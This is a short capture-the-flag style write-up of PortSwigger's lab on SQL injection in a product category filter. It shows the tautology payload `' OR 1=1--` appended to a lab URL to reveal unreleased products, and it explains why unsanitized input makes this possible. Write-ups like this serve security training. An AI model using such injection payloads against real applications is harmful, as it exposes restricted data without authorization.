# SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data - PortSwigger

## Challenge Description

* **Category**: SQL Injection
* **Description**: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
* **Link Resource**: `https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data`

## Solution

### Step 1 : Find the vulnerability

* Basically in many cases of SQL database, it mostly using single quotes `'` to denote string literals.
* That reason is completely enough to give our first shot to this payload

```
'+OR+1=1--
```

[firstshot](../../assets/portswigger2-1.png)

### Step 2 : ExploIT

* We will use our payload to the search cell like this

```
https://0aad004103c1f0aa801a08f0002000b8.web-security-academy.net/filter?category=Gifts+%27OR+1=1--
```

[exploitation](../../assets/portswigger2-2.png)

## Result

We are able to acquire the flag.

## Explanation

The vulnerability exploited here is a **Boolean-based SQL Injection** in the `WHERE` clause of the product category filter. Because the application directly embeds user input into the SQL query without sanitization, we injected the payload `' OR 1=1--` to bypass the intended condition `released = 1`. The injected logic forces the query to always evaluate as true, returning all products from the database, including unreleased ones that should have been hidden. This demonstrates how improperly handled input in SQL queries can expose sensitive or restricted data.
